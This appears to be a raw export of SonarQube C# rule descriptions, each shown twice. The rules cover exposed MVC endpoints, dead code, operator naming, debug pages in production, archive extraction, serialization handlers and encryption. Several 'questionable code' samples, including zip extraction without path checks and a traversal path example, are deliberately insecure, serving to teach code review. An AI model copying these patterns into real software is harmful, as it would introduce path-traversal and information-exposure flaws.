  <li> the response contains some sensitive information which the user shouldn't have access to. </li>
</ul>
<p>no access control prevents attackers from successfully performing a forbidden request.</p>
<ul>
  <li> an attacker can get sensitive information by analyzing the returned errors. For example, a web service can expose the existence of user
  accounts by returning 403 (Forbidden) instead of 404 (Not Found) when an attacker ask for them. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Never trust any part of the request to be safe. Make sure that the URI, header and body are properly <a
href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">sanitized</a> before being used. Their content, length, encoding, name (ex: name
of URL query parameters) should be checked. Validate that the values are in a predefined whitelist. The opposite, i.e. searching for dangerous values
in a given input, can easily miss some of them.</p>
<p>Do not rely solely on cookies when you implement your authentication and permission logic. Use additional protections such as <a
href=""https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet"">CSRF</a> tokens when possible.</p>
<p>Do not expose sensitive information in your response. If the endpoint serves files, limit the access to a dedicated directory. <a
href=""https://www.owasp.org/index.php/Session_Management_Cheat_Sheet#Cookies"">Protect your sensitive cookies</a> so that client-side javascript cannot
read or modify them.</p>
<p>Sanitize all values before returning them in a response, be it in the body, header or status code. Special care should be taken to avoid the
following attacks:</p>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet"">Cross-site Scripting (XSS)</a>, which happens when
  an unsafe value is included in an HTML page. </li>
  <li> <a href=""https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet"">Unvalidated redirects</a> which can happen when the
  <code>Location</code> header is compromised. </li>
</ul>
<p>Restrict security-sensitive actions, such as file upload, to authenticated users.</p>
<p>Be careful when errors are returned to the client, as they can provide sensitive information. Use 404 (Not Found) instead of 403 (Forbidden) when
the existence of a resource is sensitive.</p>
<h2>Questionable Code Example</h2>
<pre>
public class Foo : System.Web.Mvc.Controller
{
    public string MyProperty
    {
        get { return ""test""; }
        set { }
    }
    public Foo() { }

    public void PublicFoo() // Questionable. Public Controller methods are exposed as HTTP endpoints.
    {
        // ...
    }
    [System.Web.Mvc.NonAction]
    public void NotAnEndpoint() // This is not an endpoint because of the NonAction attribute.
    { }
    protected void ProtectedFoo() { }
    internal void InternalFoo() { }
    private void PrivateFoo() { }
    private class Bar : System.Web.Mvc.Controller
    {
        public void InnerFoo() { }
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/352.html"">MITRE, CWE-352</a> - Cross-Site Request Forgery (CSRF) </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/79.html"">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  ('Cross-site Scripting') </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/22.html"">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal') </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> OWASP Top 10 2017 Category A7 - Cross-Site Scripting (XSS) </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",csharpsquid:S4529,cs,C#,"<p>Exposing HTTP endpoints is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3072"">CVE-2016-3072</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3175"">CVE-2015-3175</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0218"">CVE-2003-0218</a> </li>
</ul>
<p>HTTP endpoints are webservices' main entrypoint. Attackers will take advantage of any vulnerability by sending crafted inputs for headers
(including cookies), body and URI. No input should be trusted and extreme care should be taken with all returned value (header, body and status
code).</p>
<p>This rule flags code which creates HTTP endpoint via .Net Framework MVC Controllers. It guides security code reviews to security-sensitive
code.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> an input is not sanitized before being used. This includes any value coming from the URI, header, body and cookies. </li>
  <li> the response contains some unsafe data. for example the input could come from a database which contains user inputs. Check the response's
  headers, cookies, body and status code. </li>
  <li> the response contains some sensitive information which the user shouldn't have access to. </li>
</ul>
<p>no access control prevents attackers from successfully performing a forbidden request.</p>
<ul>
  <li> an attacker can get sensitive information by analyzing the returned errors. For example, a web service can expose the existence of user
  accounts by returning 403 (Forbidden) instead of 404 (Not Found) when an attacker ask for them. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Never trust any part of the request to be safe. Make sure that the URI, header and body are properly <a
href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">sanitized</a> before being used. Their content, length, encoding, name (ex: name
of URL query parameters) should be checked. Validate that the values are in a predefined whitelist. The opposite, i.e. searching for dangerous values
in a given input, can easily miss some of them.</p>
<p>Do not rely solely on cookies when you implement your authentication and permission logic. Use additional protections such as <a
href=""https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet"">CSRF</a> tokens when possible.</p>
<p>Do not expose sensitive information in your response. If the endpoint serves files, limit the access to a dedicated directory. <a
href=""https://www.owasp.org/index.php/Session_Management_Cheat_Sheet#Cookies"">Protect your sensitive cookies</a> so that client-side javascript cannot
read or modify them.</p>
<p>Sanitize all values before returning them in a response, be it in the body, header or status code. Special care should be taken to avoid the
following attacks:</p>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet"">Cross-site Scripting (XSS)</a>, which happens when
  an unsafe value is included in an HTML page. </li>
  <li> <a href=""https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet"">Unvalidated redirects</a> which can happen when the
  <code>Location</code> header is compromised. </li>
</ul>
<p>Restrict security-sensitive actions, such as file upload, to authenticated users.</p>
<p>Be careful when errors are returned to the client, as they can provide sensitive information. Use 404 (Not Found) instead of 403 (Forbidden) when
the existence of a resource is sensitive.</p>
<h2>Questionable Code Example</h2>
<pre>
public class Foo : System.Web.Mvc.Controller
{
    public string MyProperty
    {
        get { return ""test""; }
        set { }
    }
    public Foo() { }

    public void PublicFoo() // Questionable. Public Controller methods are exposed as HTTP endpoints.
    {
        // ...
    }
    [System.Web.Mvc.NonAction]
    public void NotAnEndpoint() // This is not an endpoint because of the NonAction attribute.
    { }
    protected void ProtectedFoo() { }
    internal void InternalFoo() { }
    private void PrivateFoo() { }
    private class Bar : System.Web.Mvc.Controller
    {
        public void InnerFoo() { }
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/352.html"">MITRE, CWE-352</a> - Cross-Site Request Forgery (CSRF) </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/79.html"">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  ('Cross-site Scripting') </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/22.html"">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal') </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> OWASP Top 10 2017 Category A7 - Cross-Site Scripting (XSS) </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",Exposing HTTP endpoints is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a1', 'owasp-a3', 'owasp-a7', 'sans-top25-insecure', 'sans-top25-porous', 'sans-top25-risky', 'spring']",SECURITY_HOTSPOT
2016-02-17T22:05:07+0100,"<p><code>private</code> or <code>internal</code> types or <code>private</code> members that are never executed or referenced are dead code:
unnecessary, inoperative code that should be removed. Cleaning out dead code decreases the size of the maintained codebase, making it easier to
understand the program and preventing bugs from being introduced.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo
{
  private void UnusedPrivateMethod() {...} // Noncompliant

  private class UnusedClass {...} // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo
{
  public Foo()
  {
    UsedPrivateMethod();
  }

  private void UsedPrivateMethod()
  {
    var c = new UsedClass();
  }

  private class UsedClass {...}
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't raise issues on:</p>
<ul>
  <li> Empty constructors </li>
  <li> Attributed members </li>
  <li> <code>Main</code> method </li>
  <li> Methods with event handler signature <code>void Foo(object, EventArgs)</code> that are declared in partial class </li>
  <li> Empty serialization constructor on type with <code>System.SerializableAttribute</code> attribute. </li>
  <li> Internals in assemblies that have a <code>System.Runtime.CompilerServices.InternalsVisibleToAttribute</code> attribute. </li>
</ul>",csharpsquid:S1144,cs,C#,"<p><code>private</code> or <code>internal</code> types or <code>private</code> members that are never executed or referenced are dead code:
unnecessary, inoperative code that should be removed. Cleaning out dead code decreases the size of the maintained codebase, making it easier to
understand the program and preventing bugs from being introduced.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo
{
  private void UnusedPrivateMethod() {...} // Noncompliant

  private class UnusedClass {...} // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo
{
  public Foo()
  {
    UsedPrivateMethod();
  }

  private void UsedPrivateMethod()
  {
    var c = new UsedClass();
  }

  private class UsedClass {...}
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't raise issues on:</p>
<ul>
  <li> Empty constructors </li>
  <li> Attributed members </li>
  <li> <code>Main</code> method </li>
  <li> Methods with event handler signature <code>void Foo(object, EventArgs)</code> that are declared in partial class </li>
  <li> Empty serialization constructor on type with <code>System.SerializableAttribute</code> attribute. </li>
  <li> Internals in assemblies that have a <code>System.Runtime.CompilerServices.InternalsVisibleToAttribute</code> attribute. </li>
</ul>",Unused private types or members should be removed,[],MAJOR,['unused'],CODE_SMELL
2017-07-28T12:37:58+0200,"<p>Operator overloading is convenient but unfortunately not portable across languages. To be able to access the same functionality from another
language you need to provide an alternate named method following the convention:</p>
<table>
  <tbody>
    <tr>
      <th>Operator</th>
      <th>Method Name</th>
    </tr>
    <tr>
      <th><code>+</code> (binary)</th>
      <th>Add</th>
    </tr>
    <tr>
      <th><code>&amp;</code></th>
      <th>BitwiseAnd</th>
    </tr>
    <tr>
      <th><code>|</code></th>
      <th>BitwiseOr</th>
    </tr>
    <tr>
      <th><code>/</code></th>
      <th>Divide</th>
    </tr>
    <tr>
      <th><code>==</code></th>
      <th>Equals</th>
    </tr>
    <tr>
      <th><code>^</code></th>
      <th>Xor</th>
    </tr>
    <tr>
      <th><code>&gt;</code></th>
      <th>Compare</th>
    </tr>
    <tr>
      <th><code>&gt;=</code></th>
      <th>Compare</th>
    </tr>
    <tr>
      <th><code>!=</code></th>
      <th>Equals</th>
    </tr>
    <tr>
      <th><code>&lt;</code></th>
      <th>Compare</th>
    </tr>
    <tr>
      <th><code>&lt;=</code></th>
      <th>Compare</th>
    </tr>
    <tr>
      <th><code>!</code></th>
      <th>LogicalNot</th>
    </tr>
    <tr>
      <th><code>%</code></th>
      <th>Mod</th>
    </tr>
    <tr>
      <th><code>*</code> (binary)</th>
      <th>Multiply</th>
    </tr>
    <tr>
      <th><code>~</code></th>
      <th>OnesComplement</th>
    </tr>
    <tr>
      <th><code>-</code> (binary)</th>
      <th>Subtract</th>
    </tr>
    <tr>
      <th><code>-</code> (unary)</th>
      <th>Negate</th>
    </tr>
    <tr>
      <th><code>+</code> (unary)</th>
      <th>Plus</th>
    </tr>
  </tbody>
</table>
<p>This rule raises an issue when there is an operator overload without the expected named alternative method.</p>
<h2>Exceptions</h2>
<p>This rule does not raise an issue when the class implementing the comparison operators <code>&gt;</code>, <code>&lt;</code>, <code>&gt;=</code> and
<code>&lt;=</code> contains a method named <code>CompareTo</code>.</p>",csharpsquid:S4069,cs,C#,"<p>Operator overloading is convenient but unfortunately not portable across languages. To be able to access the same functionality from another
language you need to provide an alternate named method following the convention:</p>
<table>
  <tbody>
    <tr>
      <th>Operator</th>
      <th>Method Name</th>
    </tr>
    <tr>
      <th><code>+</code> (binary)</th>
      <th>Add</th>
    </tr>
    <tr>
      <th><code>&amp;</code></th>
      <th>BitwiseAnd</th>
    </tr>
    <tr>
      <th><code>|</code></th>
      <th>BitwiseOr</th>
    </tr>
    <tr>
      <th><code>/</code></th>
      <th>Divide</th>
    </tr>
    <tr>
      <th><code>==</code></th>
      <th>Equals</th>
    </tr>
    <tr>
      <th><code>^</code></th>
      <th>Xor</th>
    </tr>
    <tr>
      <th><code>&gt;</code></th>
      <th>Compare</th>
    </tr>
    <tr>
      <th><code>&gt;=</code></th>
      <th>Compare</th>
    </tr>
    <tr>
      <th><code>!=</code></th>
      <th>Equals</th>
    </tr>
    <tr>
      <th><code>&lt;</code></th>
      <th>Compare</th>
    </tr>
    <tr>
      <th><code>&lt;=</code></th>
      <th>Compare</th>
    </tr>
    <tr>
      <th><code>!</code></th>
      <th>LogicalNot</th>
    </tr>
    <tr>
      <th><code>%</code></th>
      <th>Mod</th>
    </tr>
    <tr>
      <th><code>*</code> (binary)</th>
      <th>Multiply</th>
    </tr>
    <tr>
      <th><code>~</code></th>
      <th>OnesComplement</th>
    </tr>
    <tr>
      <th><code>-</code> (binary)</th>
      <th>Subtract</th>
    </tr>
    <tr>
      <th><code>-</code> (unary)</th>
      <th>Negate</th>
    </tr>
    <tr>
      <th><code>+</code> (unary)</th>
      <th>Plus</th>
    </tr>
  </tbody>
</table>
<p>This rule raises an issue when there is an operator overload without the expected named alternative method.</p>
<h2>Exceptions</h2>
<p>This rule does not raise an issue when the class implementing the comparison operators <code>&gt;</code>, <code>&lt;</code>, <code>&gt;=</code> and
<code>&lt;=</code> contains a method named <code>CompareTo</code>.</p>",Operator overloads should have named alternatives,[],MINOR,['convention'],CODE_SMELL
2018-11-29T11:10:36+0100,"<p>Delivering code in production with debug features activated is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1999007"">CVE-2018-1999007</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5306"">CVE-2015-5306</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2006"">CVE-2013-2006</a> </li>
</ul>
<p>An application's debug features enable developers to find bugs more easily. It often gives access to detailed information on both the system
running the application and users. Sometime it even enables the execution of custom commands. Thus deploying on production servers an application
which has debug features activated is extremely dangerous.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the code or configuration enabling the application debug features is deployed on production servers. </li>
  <li> the application runs by default with debug features activated. </li>
</ul>
<p>You are at risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not enable debug features on production servers.</p>
<p>The .Net Core framework offers multiple features which help during debug.
<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDeveloperExceptionPage</code> and
<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDatabaseErrorPage</code> are two of them. Make sure that those features are disabled in
production.</p>
<p>Use <code>if (env.IsDevelopment())</code> to disable debug code.</p>
<h2>Questionable Code Example</h2>
<p>This rule raises issues when the following .Net Core methods are called:
<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDeveloperExceptionPage</code>,
<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDatabaseErrorPage</code>. No Issue is raised when those calls are disabled by <code>if
(env.IsDevelopment())</code>.</p>
<pre>
using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Hosting;

namespace mvcApp
{
    public class Startup2
    {
        public void Configure(IApplicationBuilder app, IHostingEnvironment env)
        {
            if (env.IsDevelopment())
            {
                // The following calls are ok because they are disabled in production
                app.UseDeveloperExceptionPage();
                app.UseDatabaseErrorPage();
            }
            // Those calls are Questionable because it seems that they will run in production
            app.UseDeveloperExceptionPage(); // Questionable
            app.UseDatabaseErrorPage(); // Questionable
        }
    }
}

</pre>
<h2>Exceptions</h2>
<p>This rule does not analyze configuration files. Make sure that debug mode is not enabled by default in those files.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/489.html"">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/215.html"">MITRE, CWE-215</a> - Information Exposure Through Debug Information </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
</ul>",csharpsquid:S4507,cs,C#,"<p>Delivering code in production with debug features activated is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1999007"">CVE-2018-1999007</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5306"">CVE-2015-5306</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2006"">CVE-2013-2006</a> </li>
</ul>
<p>An application's debug features enable developers to find bugs more easily. It often gives access to detailed information on both the system
running the application and users. Sometime it even enables the execution of custom commands. Thus deploying on production servers an application
which has debug features activated is extremely dangerous.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the code or configuration enabling the application debug features is deployed on production servers. </li>
  <li> the application runs by default with debug features activated. </li>
</ul>
<p>You are at risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not enable debug features on production servers.</p>
<p>The .Net Core framework offers multiple features which help during debug.
<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDeveloperExceptionPage</code> and
<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDatabaseErrorPage</code> are two of them. Make sure that those features are disabled in
production.</p>
<p>Use <code>if (env.IsDevelopment())</code> to disable debug code.</p>
<h2>Questionable Code Example</h2>
<p>This rule raises issues when the following .Net Core methods are called:
<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDeveloperExceptionPage</code>,
<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDatabaseErrorPage</code>. No Issue is raised when those calls are disabled by <code>if
(env.IsDevelopment())</code>.</p>
<pre>
using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Hosting;

namespace mvcApp
{
    public class Startup2
    {
        public void Configure(IApplicationBuilder app, IHostingEnvironment env)
        {
            if (env.IsDevelopment())
            {
                // The following calls are ok because they are disabled in production
                app.UseDeveloperExceptionPage();
                app.UseDatabaseErrorPage();
            }
            // Those calls are Questionable because it seems that they will run in production
            app.UseDeveloperExceptionPage(); // Questionable
            app.UseDatabaseErrorPage(); // Questionable
        }
    }
}

</pre>
<h2>Exceptions</h2>
<p>This rule does not analyze configuration files. Make sure that debug mode is not enabled by default in those files.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/489.html"">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/215.html"">MITRE, CWE-215</a> - Information Exposure Through Debug Information </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
</ul>",Delivering code in production with debug features activated is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a3']",SECURITY_HOTSPOT
2018-12-11T09:17:07+0100,"<p>Expanding archive files is security-sensitive. For example, expanding archive files has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1263"">CVE-2018-1263</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16131"">CVE-2018-16131</a> </li>
</ul>
<p>Applications that expand archive files (zip, tar, jar, war, 7z, ...) should verify the path where the archive's files are expanded and not trust
blindly the content of the archive. Archive's files should not be expanded outside of the root directory where the archive is supposed to be expanded.
Also, applications should control the size of the expanded data to not be a victim of Zip Bomb attack. Failure to do so could allow an attacker to use
a specially crafted archive that holds directory traversal paths (e.g. ../../attacker.sh) or the attacker could overload the file system, processors
or memory of the operating system where the archive is expanded making the target OS completely unusable.</p>
<p>This rule raises an issue when code handle archives. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> there is no validation of the name of the archive entry </li>
  <li> there is no validation of the effective path where the archive entry is going to be expanded </li>
  <li> there is no validation of the size of the expanded archive entry </li>
  <li> there is no validation of the ratio between the compressed and uncompressed archive entry </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<p> </p>
<h2>Recommended Secure Coding Practices</h2>
<p>Validate the full path of the extracted file against the full path of the directory where files are expanded.</p>
<ul>
  <li> the canonical path of the expanded file must start with the canonical path of the directory where files are extracted. </li>
  <li> the name of the archive entry must not contain "".."", i.e. reference to a parent directory. </li>
</ul>
<p>Stop extracting the archive if any of its entries has been tainted with a directory traversal path.</p>
<p>Define and control the ratio between compressed and uncompress bytes.</p>
<p>Define and control the maximum allowed expanded file size.</p>
<p>Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold.</p>
<h2>Questionable Code Example</h2>
<pre>
foreach (ZipArchiveEntry entry in archive.Entries)
{
    //  entry.FullName could contain parent directory references "".."" and the destinationPath variable could become outside of the desired path
    string destinationPath = Path.GetFullPath(Path.Combine(path, entry.FullName));

    entry.ExtractToFile(destinationPath); // Questionable, extracts the entry in a file

    Stream stream;
    stream = entry.Open(); // Questionable, the entry is about to be extracted
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/409.html"">MITRE, CWE-409</a> - Improper Handling of Highly Compressed Data (Data Amplification)
  </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://wiki.sei.cmu.edu/confluence/display/java/IDS04-J.+Safely+extract+files+from+ZipInputStream"">CERT, IDS04-J.</a> - Safely
  extract files from ZipInputStream </li>
  <li> Snyk Research Team: <a href=""https://snyk.io/research/zip-slip-vulnerability"">Zip Slip Vulnerability</a> </li>
</ul>",csharpsquid:S5042,cs,C#,"<p>Expanding archive files is security-sensitive. For example, expanding archive files has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1263"">CVE-2018-1263</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16131"">CVE-2018-16131</a> </li>
</ul>
<p>Applications that expand archive files (zip, tar, jar, war, 7z, ...) should verify the path where the archive's files are expanded and not trust
blindly the content of the archive. Archive's files should not be expanded outside of the root directory where the archive is supposed to be expanded.
Also, applications should control the size of the expanded data to not be a victim of Zip Bomb attack. Failure to do so could allow an attacker to use
a specially crafted archive that holds directory traversal paths (e.g. ../../attacker.sh) or the attacker could overload the file system, processors
or memory of the operating system where the archive is expanded making the target OS completely unusable.</p>
<p>This rule raises an issue when code handle archives. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> there is no validation of the name of the archive entry </li>
  <li> there is no validation of the effective path where the archive entry is going to be expanded </li>
  <li> there is no validation of the size of the expanded archive entry </li>
  <li> there is no validation of the ratio between the compressed and uncompressed archive entry </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<p> </p>
<h2>Recommended Secure Coding Practices</h2>
<p>Validate the full path of the extracted file against the full path of the directory where files are expanded.</p>
<ul>
  <li> the canonical path of the expanded file must start with the canonical path of the directory where files are extracted. </li>
  <li> the name of the archive entry must not contain "".."", i.e. reference to a parent directory. </li>
</ul>
<p>Stop extracting the archive if any of its entries has been tainted with a directory traversal path.</p>
<p>Define and control the ratio between compressed and uncompress bytes.</p>
<p>Define and control the maximum allowed expanded file size.</p>
<p>Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold.</p>
<h2>Questionable Code Example</h2>
<pre>
foreach (ZipArchiveEntry entry in archive.Entries)
{
    //  entry.FullName could contain parent directory references "".."" and the destinationPath variable could become outside of the desired path
    string destinationPath = Path.GetFullPath(Path.Combine(path, entry.FullName));

    entry.ExtractToFile(destinationPath); // Questionable, extracts the entry in a file

    Stream stream;
    stream = entry.Open(); // Questionable, the entry is about to be extracted
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/409.html"">MITRE, CWE-409</a> - Improper Handling of Highly Compressed Data (Data Amplification)
  </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://wiki.sei.cmu.edu/confluence/display/java/IDS04-J.+Safely+extract+files+from+ZipInputStream"">CERT, IDS04-J.</a> - Safely
  extract files from ZipInputStream </li>
  <li> Snyk Research Team: <a href=""https://snyk.io/research/zip-slip-vulnerability"">Zip Slip Vulnerability</a> </li>
</ul>",Expanding archive files is security-sensitive,[],CRITICAL,"['cert', 'cwe']",SECURITY_HOTSPOT
2017-07-07T12:23:26+0200,"<p>Serialization event handlers that don't have the correct signature will simply not be called, thus bypassing any attempts to augment the automated
de/serialization.</p>
<p>This rule raises issue when a method marked with one of the following attributes is not <code>private</code>, does not return <code>void</code>,
has type parameters, or does not have a single parameter of type <code>System.Runtime.Serialization.StreamingContext</code>:</p>
<ul>
  <li> <code>System.Runtime.Serialization.OnSerializingAttribute</code> </li>
  <li> <code>System.Runtime.Serialization.OnSerializedAttribute</code> </li>
  <li> <code>System.Runtime.Serialization.OnDeserializingAttribute</code> </li>
  <li> <code>System.Runtime.Serialization.OnDeserializedAttribute</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
[Serializable]
public class Foo
{
    [OnSerializing]
    public void OnSerializing(StreamingContext context) {} // Noncompliant should be private

    [OnSerialized]
    int OnSerialized(StreamingContext context) {} // Noncompliant should return void

    [OnDeserializing]
    void OnDeserializing() {} // Noncompliant should have a single parameter of type StreamingContext

    [OnSerializing]
    public void OnSerializing2&lt;T&gt;(StreamingContext context) {} // Noncompliant should have no type parameters

    [OnDeserialized]
    void OnDeserialized(StreamingContext context, string str) {} // Noncompliant should have a single parameter of type StreamingContext
}
</pre>
<h2>Compliant Solution</h2>
<pre>
[Serializable]
public class Foo
{
    [OnSerializing]
    private void OnSerializing(StreamingContext context) {}

    [OnSerialized]
    private void OnSerialized(StreamingContext context) {}

    [OnDeserializing]
    private void OnDeserializing(StreamingContext context) {}

    [OnDeserialized]
    private void OnDeserialized(StreamingContext context) {}
}
</pre>",csharpsquid:S3927,cs,C#,"<p>Serialization event handlers that don't have the correct signature will simply not be called, thus bypassing any attempts to augment the automated
de/serialization.</p>
<p>This rule raises issue when a method marked with one of the following attributes is not <code>private</code>, does not return <code>void</code>,
has type parameters, or does not have a single parameter of type <code>System.Runtime.Serialization.StreamingContext</code>:</p>
<ul>
  <li> <code>System.Runtime.Serialization.OnSerializingAttribute</code> </li>
  <li> <code>System.Runtime.Serialization.OnSerializedAttribute</code> </li>
  <li> <code>System.Runtime.Serialization.OnDeserializingAttribute</code> </li>
  <li> <code>System.Runtime.Serialization.OnDeserializedAttribute</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
[Serializable]
public class Foo
{
    [OnSerializing]
    public void OnSerializing(StreamingContext context) {} // Noncompliant should be private

    [OnSerialized]
    int OnSerialized(StreamingContext context) {} // Noncompliant should return void

    [OnDeserializing]
    void OnDeserializing() {} // Noncompliant should have a single parameter of type StreamingContext

    [OnSerializing]
    public void OnSerializing2&lt;T&gt;(StreamingContext context) {} // Noncompliant should have no type parameters

    [OnDeserialized]
    void OnDeserialized(StreamingContext context, string str) {} // Noncompliant should have a single parameter of type StreamingContext
}
</pre>
<h2>Compliant Solution</h2>
<pre>
[Serializable]
public class Foo
{
    [OnSerializing]
    private void OnSerializing(StreamingContext context) {}

    [OnSerialized]
    private void OnSerialized(StreamingContext context) {}

    [OnDeserializing]
    private void OnDeserializing(StreamingContext context) {}

    [OnDeserialized]
    private void OnDeserialized(StreamingContext context) {}
}
</pre>",Serialization event handlers should be implemented correctly,[],MAJOR,[],BUG
2018-11-29T11:10:36+0100,"<p>Encrypting data is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7902"">CVE-2017-7902</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-1378"">CVE-2006-1378</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1376"">CVE-2003-1376</a> </li>
</ul>
<p>Proper encryption requires both the encryption algorithm and the key to be strong. Obviously the private key needs to remain secret and be renewed
regularly. However these are not the only means to defeat or weaken an encryption.</p>
<p> </p>
<p>This rule flags function calls that initiate encryption/decryption. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
